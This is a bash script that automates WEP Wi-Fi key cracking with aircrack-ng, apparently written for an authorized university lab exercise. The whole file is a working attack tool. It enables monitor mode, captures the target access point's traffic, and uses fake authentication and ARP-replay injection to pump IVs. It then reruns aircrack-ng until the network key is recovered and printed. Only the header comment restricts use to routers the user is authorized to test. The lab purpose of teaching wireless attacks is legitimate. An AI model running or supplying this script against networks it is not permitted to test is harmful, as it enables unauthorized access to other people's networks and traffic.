#!/usr/bin/env bash
#
# wep-crack.sh — authorized WEP key-recovery automation (Lab #10, CS VIII)
#
# Drives the standard aircrack-ng flow against a WEP access point you are
# authorized to test (your own GL-AR300M16, or the class router during the
# evaluation window). WEP falls to a statistical/PTW attack on captured IVs —
# NO dictionary is used, which is the whole point of the lab.
#
#   active  mode: monitor -> fake-auth -> ARP replay (needs an injecting card,
#                 e.g. Atheros AR9271). This is what recovers the key fast.
#   passive mode: monitor + capture only (works on the Intel AC8260, which
#                 cannot inject). Good for practice and for the analysis half
#                 of the writeup.
#
# Usage:
#   sudo ./wep-crack.sh -i wlp2s0 -b <AP_BSSID> -c <CHANNEL> [-e ESSID] [-m active|passive] [-o prefix] [-t N]
#
# Example:
#   sudo ./wep-crack.sh -i wlan0 -b 11:22:33:44:55:66 -c 6 -m active -o cap_gl
#
# Cleanup (stop attacks, restore managed mode, restart NetworkManager) runs on exit,
# including Ctrl-C. If WiFi still stays dark, see COMMANDS.md section 8.
#
set -u

# ---- defaults -------------------------------------------------------------
IFACE=""
BSSID=""
CHANNEL=""
ESSID=""
MODE="active"
PREFIX="wepcap"
IV_TARGET=20000          # aircrack is retried each time #Data grows by this much (-t)
MIN_IVS=5000             # no aircrack attempt until #Data reaches this many IVs
RETRY_SECS=15            # how often to re-check the capture / re-run aircrack

usage() { sed -n '2,30p' "$0"; exit 1; }

# Type of an interface ("managed", "monitor", ...); empty if the interface doesn't exist.
iface_type() { iw dev "$1" info 2>/dev/null | awk '$1=="type"{print $2}'; }

while getopts ":i:b:c:e:m:o:t:h" opt; do
  case "$opt" in
    i) IFACE="$OPTARG" ;;
    b) BSSID="$OPTARG" ;;
    c) CHANNEL="$OPTARG" ;;
    e) ESSID="$OPTARG" ;;
    m) MODE="$OPTARG" ;;
    o) PREFIX="$OPTARG" ;;
    t) IV_TARGET="$OPTARG" ;;
    h|*) usage ;;
  esac
done

# ---- preflight ------------------------------------------------------------
[[ $EUID -eq 0 ]] || { echo "[!] Run with sudo."; exit 1; }
[[ -n "$IFACE" && -n "$BSSID" && -n "$CHANNEL" ]] || usage
for t in airmon-ng airodump-ng aireplay-ng aircrack-ng iw ip nmcli; do
  command -v "$t" >/dev/null || { echo "[!] Missing: $t (sudo dnf install aircrack-ng)"; exit 1; }
done
[[ "$MODE" == "active" || "$MODE" == "passive" ]] || { echo "[!] -m must be active|passive"; exit 1; }
[[ "$IV_TARGET" =~ ^[1-9][0-9]*$ ]] || { echo "[!] -t must be a positive number of IVs"; exit 1; }

# ---- output location ------------------------------------------------------
# All capture/key/log files live under logs/ (gitignored) to keep the repo clean.
LOGDIR="logs"
mkdir -p "$LOGDIR"
OUT="${LOGDIR}/${PREFIX}"

MON=""        # monitor interface name, discovered after airmon-ng start
AIRODUMP_PID=""
REPLAY_PID=""
FAKEAUTH_PID=""
AIRMON_LOG="${LOGDIR}/airmon.log"   # airmon-ng and NetworkManager output for this run
: > "$AIRMON_LOG"

cleanup() {
  echo; echo "[*] Cleaning up..."
  for pid in "$FAKEAUTH_PID" "$REPLAY_PID" "$AIRODUMP_PID"; do
    [[ -n "$pid" ]] && kill "$pid" 2>/dev/null
  done
  # A separate <iface>mon vif is removed by airmon-ng stop.
  if [[ -n "$MON" && "$MON" != "$IFACE" ]]; then airmon-ng stop "$MON" >>"$AIRMON_LOG" 2>&1; fi
  # Single-vif drivers (e.g. rtl8723be) keep the managed name in monitor mode, and airmon-ng
  # stop can't switch it back while the link is up. Take the link down first.
  if [[ "$(iface_type "$IFACE")" == monitor ]]; then
    ip link set "$IFACE" down
    iw dev "$IFACE" set type managed 2>>"$AIRMON_LOG"
    ip link set "$IFACE" up
  fi
  # NetworkManager only adopts a Wi-Fi device that is in managed mode when it starts.
  systemctl restart NetworkManager 2>/dev/null
  local now
  now=$(iface_type "$IFACE")
  if [[ "$now" == managed ]]; then
    echo "[*] $IFACE is in managed mode and NetworkManager restarted."
    for _ in 1 2 3 4 5; do
      nmcli -t -f DEVICE device 2>/dev/null | grep -qx "$IFACE" && break
      sleep 2
    done
    if nmcli -t -f DEVICE device 2>/dev/null | grep -qx "$IFACE"; then
      echo "[*] NetworkManager sees $IFACE. WiFi should reconnect."
    else
      echo "[!] NetworkManager does not list $IFACE. Check: nmcli device status" >&2
    fi
  else
    echo "[!] $IFACE is in '${now:-missing}' mode, so WiFi will stay down." >&2
    echo "    Restore it by hand: see COMMANDS.md section 8." >&2
  fi
}
# cleanup runs exactly once, on the way out. Ctrl-C (INT) / TERM don't run
# cleanup directly — they turn into a real exit, which fires the EXIT trap.
# (Trapping cleanup on INT alone would run it but then resume the loop, so the
# program never actually finished.)
trap cleanup EXIT
trap 'exit 130' INT TERM

# ---- start monitor --------------------------------------------------------
echo "[*] Freeing the radio (stopping NetworkManager/wpa_supplicant)..."
airmon-ng check kill >>"$AIRMON_LOG" 2>&1

echo "[*] Enabling monitor mode on $IFACE..."
airmon-ng start "$IFACE" >>"$AIRMON_LOG" 2>&1

# airmon-ng may name it <iface>mon, or rename to e.g. mon0 — discover it.
MON=$(iw dev | awk '/Interface/{n=$2} /type monitor/{print n; exit}')
[[ -n "$MON" ]] || { echo "[!] No monitor interface after airmon-ng start, see $AIRMON_LOG"; exit 1; }
echo "[*] Monitor interface: $MON"

echo "[*] Locking to channel $CHANNEL..."
iw dev "$MON" set channel "$CHANNEL" 2>/dev/null

# ---- start capture --------------------------------------------------------
rm -f "${OUT}"-*.cap "${OUT}"-*.csv 2>/dev/null
echo "[*] Starting capture -> ${OUT}-01.cap (BSSID $BSSID, ch $CHANNEL)"
airodump-ng --bssid "$BSSID" -c "$CHANNEL" -w "$OUT" --write-interval 1 "$MON" \
  >/dev/null 2>&1 &
AIRODUMP_PID=$!
sleep 4

# ---- active injection -----------------------------------------------------
if [[ "$MODE" == "active" ]]; then
  MYMAC=$(iw dev "$MON" info 2>/dev/null | awk '/addr/{print $2; exit}')
  echo "[*] Verifying injection on this card..."
  if ! aireplay-ng --test "$MON" 2>&1 | grep -qi "Injection is working"; then
    echo "[!] Injection test did NOT pass on $IFACE."
    echo "    This card (e.g. Intel AC8260) likely cannot inject. Falling back"
    echo "    to PASSIVE capture. Use an AR9271 USB adapter for the active attack."
    MODE="passive"
  fi
fi

if [[ "$MODE" == "active" ]]; then
  echo "[*] Associating with AP (fake auth)..."
  # keep re-authenticating every 10s so we stay associated
  aireplay-ng --fakeauth 10 -o 1 -q 10 -a "$BSSID" -h "$MYMAC" \
    ${ESSID:+-e "$ESSID"} "$MON" >/dev/null 2>&1 &
  FAKEAUTH_PID=$!

  echo "[*] Starting ARP replay to pump IVs (this is the key step)..."
  aireplay-ng --arpreplay -b "$BSSID" -h "$MYMAC" "$MON" >/dev/null 2>&1 &
  REPLAY_PID=$!
else
  echo "[*] PASSIVE mode: capturing only. IVs will accrue slowly from live traffic."
fi

# ---- crack loop -----------------------------------------------------------
echo "[*] Watching #Data and retrying aircrack-ng every ${RETRY_SECS}s..."
echo "[*] Press Ctrl-C to stop (cleanup is automatic)."
KEYFILE="${OUT}.key"
last_iv=0                # #Data at the last aircrack attempt (0 = none yet)
while true; do
  sleep "$RETRY_SECS"
  CSV="${OUT}-01.csv"
  ivs=0
  if [[ -f "$CSV" ]]; then
    # column 11 ("# IV") on the AP row matching our BSSID
    ivs=$(awk -F, -v b="${BSSID^^}" 'toupper($1) ~ b {gsub(/ /,"",$11); print $11; exit}' "$CSV")
    ivs=${ivs:-0}
  fi
  echo "    [#Data ~ ${ivs} IVs]"
  # first try once we have a reasonable pile, then again each time #Data grows by IV_TARGET
  if (( ivs >= MIN_IVS && (last_iv == 0 || ivs - last_iv >= IV_TARGET) )); then
    last_iv=$ivs
    if aircrack-ng -q -l "$KEYFILE" "${OUT}-01.cap" >/dev/null 2>&1 && [[ -s "$KEYFILE" ]]; then
      echo
      echo "============================================================"
      echo " KEY RECOVERED: $(cat "$KEYFILE")"
      echo " Saved to: $KEYFILE   Capture: ${OUT}-01.cap"
      echo "============================================================"
      exit 0
    fi
  fi
done
